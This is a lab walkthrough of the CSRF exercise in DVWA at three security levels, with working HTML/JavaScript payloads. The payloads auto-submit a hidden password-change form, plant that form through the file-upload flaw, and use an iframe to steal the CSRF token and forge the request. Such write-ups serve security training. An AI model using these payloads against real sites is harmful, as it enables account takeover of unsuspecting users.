# Cross Site Request Forgery (CSRF)

**Security level is currently: low.**

<img width="827" alt="image" src="https://user-images.githubusercontent.com/79740895/185393318-096ce7f2-f881-4aee-ba63-1a6c2074fb52.png">

Here we can change password, there is no csrf protection. We can create simple form to auto submit and change password of victim.

<details><summary markdown="span">Click to see html code for CSRF :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://192.168.170.131/vulnerabilities/csrf/">
      <input type="hidden" name="password&#95;new" value="pass" />
      <input type="hidden" name="password&#95;conf" value="pass" />
      <input type="hidden" name="Change" value="Change" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```
  
</details>

we can host this page so when victim visit page their password will automatically change.

I'm using python to host webpage:

<details><summary markdown="span">Click to see output :diamond_shape_with_a_dot_inside: </summary>
  
```Shell
C:\Users\AFTAB SAMA\Downloads>python -m http.server 80
Serving HTTP on :: port 80 (http://[::]:80/) ...
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:11] "GET /csrf-test.html HTTP/1.1" 200 -
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] code 404, message File not found
::ffff:192.168.173.222 - - [18/Aug/2022 18:03:12] "GET /favicon.ico HTTP/1.1" 404 -
```

</details>



**Security level is currently: medium.**

Same attack won't work, looking at sourcecode we know that server checks where the request came from.

<img width="333" alt="image" src="https://user-images.githubusercontent.com/79740895/185403021-db671fc3-c08d-47e2-8a8f-fdb639e50e90.png">

one way to get around is if we can upload our file in server.

Now first of all change csrf.html into csrf.php file, then set low security level and switch into file uploading vulnerability inside DVWA.

Here the above text file of html form is now saved as csrf.php is successfully uploaded in the server which you can see from given screenshot.

<img width="468" alt="image" src="https://user-images.githubusercontent.com/79740895/185402657-d1e47dc3-2884-4619-a5a6-5dafbe459a68.png">

now we can use this new url: `http://192.168.170.131/hackable/uploads/csrf.php`

password changed.



**Security level is currently: high.**

This time it use csrf token. we can read this token if we have same origin and we can do that by uploading our payload to server as shown previously.

upload this code to server:

<details><summary markdown="span">Click to see code :diamond_shape_with_a_dot_inside: </summary>
  
```html
<html>
 <body>
  <p>TOTALLY LEGITIMATE AND SAFE WEBSITE </p>
  <iframe id="myFrame" src="http://192.168.170.131/vulnerabilities/csrf" style="visibility: hidden;" onload="maliciousPayload()"></iframe>
  <script>
   function maliciousPayload() {
    console.log("start");
    var iframe = document.getElementById("myFrame");
    var doc = iframe.contentDocument  || iframe.contentWindow.document;
    var token = doc.getElementsByName("user_token")[0].value;
const http = new XMLHttpRequest();
    const url = "http://192.168.170.131/vulnerabilities/csrf/?password_new=hackerman&password_conf=hackerman&Change=Change&user_token="+token+"#";
    http.open("GET", url);
    http.send();
    console.log("password changed");
   }
  </script>
 </body>
</html>
```

</details>

on visiting this url it will read token from DOM and create password change request to server.

<img width="478" alt="image" src="https://user-images.githubusercontent.com/79740895/185408922-c1d9e774-3e43-4170-bcda-3c0269fc6260.png">

<br/>
